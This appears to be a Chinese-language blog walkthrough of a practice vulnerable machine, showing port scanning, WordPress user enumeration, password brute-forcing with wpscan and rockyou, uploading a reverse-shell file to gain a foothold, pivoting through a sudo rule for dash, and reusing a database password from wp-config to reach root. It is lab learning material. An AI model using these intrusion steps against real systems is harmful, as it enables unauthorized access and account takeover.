---
{"dg-publish":true,"title":"vulnxy_blogger","tags":["blog"],"dg-path":"安全/靶机/vulnxy_blogger.md","permalink":"/安全/靶机/vulnxy_blogger/","dgPassFrontmatter":true}
---

# 主机发现


```sh
┌──(root㉿kali)-[~/sharedir]
└─# nmap -sT -min-rate 10000 -p- 192.168.124.28
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 06:36 EST
Nmap scan report for 192.168.124.28 (192.168.124.28)
Host is up (0.32s latency).
Not shown: 39489 closed tcp ports (conn-refused), 26044 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:27:4C:4B (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 80.69 seconds

```


# web渗透


```sh
┌──(root㉿kali)-[~/sharedir]
└─# dirb http://192.168.124.28/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Feb  6 06:46:51 2025
URL_BASE: http://192.168.124.28/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.124.28/ ----
+ http://192.168.124.28/index.html (CODE:200|SIZE:10701)
+ http://192.168.124.28/server-status (CODE:403|SIZE:279)
==> DIRECTORY: http://192.168.124.28/wordpress/

...


```


应该就是wordpress

用插件枚举一下用户

```sh
wpscan --url http://192.168.124.28/wordpress -e u
```
![Pasted image 20250206200358.png](/img/user/picture/Pasted%20image%2020250206200358.png)
```txt
peter
```

直接爆破密码试试

```sh
wpscan --url http://192.168.124.28/wordpress -U peter -P /usr/share/wordlists/rockyou.txt
```

![Pasted image 20250206201332.png](/img/user/picture/Pasted%20image%2020250206201332.png)

`Username: peter, Password: peterpan`


我们就可以登陆进去了
//别忘了改一下`/etc/hosts`

![Pasted image 20250206202353.png](/img/user/picture/Pasted%20image%2020250206202353.png)

可以直接尝试上传一个反弹shell文件

![Pasted image 20250206202610.png](/img/user/picture/Pasted%20image%2020250206202610.png)

![Pasted image 20250206202704.png](/img/user/picture/Pasted%20image%2020250206202704.png)

![Pasted image 20250206202717.png](/img/user/picture/Pasted%20image%2020250206202717.png)


就已经上传成功了

![Pasted image 20250206202823.png](/img/user/picture/Pasted%20image%2020250206202823.png)




# 提权-1

```sh
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ sudo -l
Matching Defaults entries for www-data on blogger:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on blogger:
    (blog) NOPASSWD: /usr/bin/dash
```


![Pasted image 20250206203238.png](/img/user/picture/Pasted%20image%2020250206203238.png)


```sh
blog@blogger:~$ cat user.txt
cat user.txt
507ed5c488064e5ae9d2007dd2b50b53
```




# 提权-2
//之后就不知道怎么提权root了
看了WP之后发现wordpress的配置文件我们没看

```sh
ls -al
total 48
drwxr-xr-x 12 root     root     4096 Aug 16  2023 .
drwxr-xr-x 18 root     root     4096 Aug 16  2023 ..
drwxr-xr-x  2 root     root     4096 Feb  6 12:43 backups
drwxr-xr-x 10 root     root     4096 Aug 16  2023 cache
drwxr-xr-x 26 root     root     4096 Aug 16  2023 lib
drwxrwsr-x  2 root     staff    4096 Jun 30  2022 local
lrwxrwxrwx  1 root     root        9 Jan 15  2023 lock -> /run/lock
drwxr-xr-x  9 root     root     4096 Feb  6 12:35 log
drwxrwsr-x  2 root     mail     4096 Jan 15  2023 mail
drwxr-xr-x  2 root     root     4096 Jan 15  2023 opt
lrwxrwxrwx  1 root     root        4 Jan 15  2023 run -> /run
drwxr-xr-x  4 root     root     4096 Jan 15  2023 spool
drwxrwxrwt  2 root     root     4096 Feb  6 12:35 tmp
drwx------  3 www-data www-data 4096 Dec 20 11:27 www

```
c，还只能www-data才能看

```txt
/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'm3g@Bl0g123' );

```


![Pasted image 20250206205312.png](/img/user/picture/Pasted%20image%2020250206205312.png)


```
cat root.txt
1a1096b5c68cbefc74290f70d7ccb696
```



# 总结

一个基础的wordpress的渗透
提权关键点在于配置文件












